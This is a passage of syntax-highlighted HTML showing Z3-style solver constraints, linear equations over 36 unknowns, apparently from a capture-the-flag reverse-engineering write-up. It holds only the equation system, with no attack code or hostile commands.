style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75429&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;62&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18764&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span 